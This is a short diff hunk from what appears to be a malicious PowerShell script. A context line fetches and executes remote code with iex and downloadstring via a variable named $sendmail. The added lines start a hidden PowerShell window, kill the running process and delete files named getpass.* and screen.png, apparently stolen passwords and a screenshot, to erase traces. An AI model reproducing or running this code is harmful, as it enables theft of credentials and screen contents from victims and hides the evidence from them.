@@ -14,5 +14,8 @@ iex((new-object net.webclient).downloadstring($sendmail))
 #iex((new-object net.webclient).downloadstring($end))
 #sleep -s 5
 rm e:\getpass.*
-#rm e:\screen.png
+start-process powershell -windowstyle hidden
+stop-process $pid
+rm e:\getpass.*
+rm e:\screen.png
 
